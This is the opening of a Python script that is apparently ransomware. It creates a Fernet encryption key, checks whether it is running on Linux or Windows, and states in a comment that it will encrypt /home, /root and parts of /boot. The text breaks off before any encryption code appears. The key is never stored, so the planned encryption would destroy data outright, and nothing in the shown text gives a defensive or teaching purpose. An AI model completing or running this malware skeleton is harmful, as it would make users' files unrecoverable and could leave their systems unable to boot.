import platform
from cryptography.fernet import Fernet
import os


# Generate the encryption key
key = Fernet.generate_key()
fernet = Fernet(key)

# Check what OS is currently running
system = platform.system() # Gets current OS
linux = False
windows = False

# Changes bool variables to current system
if system == "Linux":
    linux = True
    windows = False
elif system == "Windows":
    windows = True
    linux = False
else:
    linux = False
    windows = False


# If Linux
# Encrypt /home, /root, ceratin commands in /boot
if linux:
    
